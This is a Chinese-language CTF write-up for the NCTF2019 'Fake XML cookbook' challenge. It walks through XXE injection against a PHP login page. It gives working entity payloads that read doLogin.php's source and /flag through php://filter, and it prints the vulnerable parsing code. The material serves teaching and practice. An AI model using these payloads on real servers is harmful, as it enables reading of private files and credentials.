---
date: 2026-11-21 20:15:00
slug: nctf2019-fake-xml-cookbook
categories:
  - XXE
  - Web
---

# [NCTF2019] Fake XML cookbook — 名字就是答案

> **题目类型**：XXE（XML 外部实体注入）
>
> **Flag**：`CTF2{72a5521b-e903-46b6-a937-056b82c51205}`

---

## 题目概述

**题名里直接写着 `XML`。**

**这种“名字就是考点”的题，先别急着找别的洞——就按它说的方向走。**

---

## 解题过程

### Step 1：确认请求体是 XML

**页面源码里翻到登录逻辑，提交方式很明确：**

```javascript
var data = "<user><username>" + username + "</username><password>" + password + "</password></user>";
$.ajax({
  type: "post",
  url: "doLogin.php",
  contentType: "application/xml",
  data: data
})
```

**三件事对上了：**

```
请求体是 XML           ← 拼接出来的标签结构
Content-Type 是 xml    ← application/xml
数据直接拼进去          ← 没有转义
```

**XML + 可控输入 = 先试 XXE。**

### Step 2：加声明和引用，验证漏洞

**抓包，把请求体改成：**

```xml
<!DOCTYPE user [ <!ENTITY x "12"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>
```

**返回里 `msg` 变成了 `12`——说明实体被解析了，DTD 是生效的。**

**第一步验证完成：这里能定义实体，也就能定义**外部**实体。**

### Step 3：先读源码，确认为什么登录没用

**响应头带着 `PHP`，所以可以用 PHP 的伪协议。**

**但要注意一个前提：**外部实体读的是“文件原文”，**不会经过 PHP 解析**。想读源码就必须先 base64 编码，否则 `<?php ... ?>` 会被当成 XML 标签吞掉。**

```xml
<!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>
```

**把返回的 base64 解出来，就是 `doLogin.php` 的源码：**

```php
$USERNAME = 'admin';
$PASSWORD = '024b87931a03f738fff6693ce0a78c88';
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try {
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $username = $creds->username;
    $password = $creds->password;

    if ($username == $USERNAME && $password == $PASSWORD) {
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 1, $username);
    } else {
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 0, $username);
    }
} catch (Exception $e) {
    $result = sprintf("<result><code>%d</code><msg>%s</msg></result>", 3, $e->getMessage());
}
```

**两个关键配置：**

```php
libxml_disable_entity_loader(false);   // 允许加载外部实体
LIBXML_NOENT | LIBXML_DTDLOAD          // 替换实体 + 加载 DTD
```

**这就是漏洞的根源。**

### Step 4：账号密码是假的线索

**源码里确实有账号和 md5 密码，但登进去没有任何东西——flag 不在数据库里，在文件系统上。**

**所以这条路走完就丢掉，别在登录上耗时间。**

### Step 5：直接读 flag

**把 `resource=` 换成 flag 文件即可：**

```xml
<!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"> ]>
<user>
  <username>&x;</username>
  <password>1</password>
</user>
```

**base64 解码：**

```text
CTF2{72a5521b-e903-46b6-a937-056b82c51205}
```

**如果 flag 文件里都是纯文本、没有 `<`，也可以直接 `SYSTEM "file:///flag"`，省掉编码这一步。**

---

| 关键点 | 说明 |
| --- | --- |
| 识别 | 题名 + `Content-Type: application/xml` + 拼接请求体 |
| 验证 | 内部实体 `<!ENTITY x "12">` 能生效，就说明 DTD 没关 |
| 读源码 | `php://filter/read=convert.base64-encode/resource=xxx` |
| 为什么编码 | 外部实体读的是原文，`<?php` 会破坏 XML 结构 |
| 漏洞根源 | `libxml_disable_entity_loader(false)` + `LIBXML_NOENT` |
| 登录没用 | 账号密码是真的，但 flag 不在库里 |

---

??? note "完整 payload"

    ```xml
    <!DOCTYPE user [ <!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"> ]>
    <user>
      <username>&x;</username>
      <password>1</password>
    </user>
    ```

    ```text
    POST /doLogin.php
    Content-Type: application/xml
    ```

??? note "这题踩的坑"

    **① 只声明实体，不写 `&x;`**

    **实体是“登记”，引用才是“取值”。**不引用，服务器根本不会去读文件。

    **② 用 `file://` 读 PHP 源码**

    读到的是原文，但 `<?php` 会被当成 XML 标签，解析直接炸。**读源码必须走 `php://filter` + base64。**

    **③ 拿账号密码去登录**

    **那是干扰项。**flag 在文件里，不在数据库里。

    **④ 忘了 `LIBXML_NOENT`**

    源码里 `loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD)` —— 少了 `LIBXML_NOENT` 实体不会被替换，你只能看到 `&x;` 本身。
